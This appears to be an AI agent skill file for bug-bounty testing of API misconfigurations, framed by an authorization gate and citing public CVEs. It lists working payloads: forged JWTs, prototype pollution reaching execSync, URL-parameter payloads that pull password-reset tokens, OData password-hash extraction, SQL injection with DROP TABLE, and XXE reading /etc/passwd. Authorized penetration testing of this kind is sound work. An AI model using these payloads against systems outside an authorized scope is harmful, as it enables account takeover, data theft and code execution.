---
name: hunt-api-misconfig
description: Hunt API security misconfiguration
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, owasp_api_top10_2023, public_research
report_count: 0
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
state reaches a later operation.

Hunt sequence:

1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
2. **Pollute harmless marker properties.** Send variants such as:

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
```

3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
   server errors mentioning object properties, changed job output, template/render errors, or command/job
   behavior changes.
4. **Escalate only through learned sinks.** Candidate properties depend on the sink:

```
{"__proto__":{"json spaces":10}}
{"__proto__":{"status":555}}
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
```

5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.

### Server-Side Parameter Pollution in Backend URL / REST URL Construction

Use this when a frontend form or endpoint appears to call a server-side API on your behalf
(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
ordinary client-side query pollution. The server takes your input and interpolates it into a backend
URL path or query string, such as:

```
/api/internal/users/<username>/field/email
/api/users/<id>
/api/users?username=<username>&field=email
```

Hunt sequence:

1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
   referenced account, the input is in a REST path segment. Then try appending route fragments such as
   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
   and field names.
5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
   sensitive field such as a reset token or secret for another user, then using that token in the normal
   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
   feedback.

Payload patterns to try, adapted to the observed parameter name:

```
username=administrator%23
username=administrator%3f
username=administrator%2f..%2fvictimuser
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
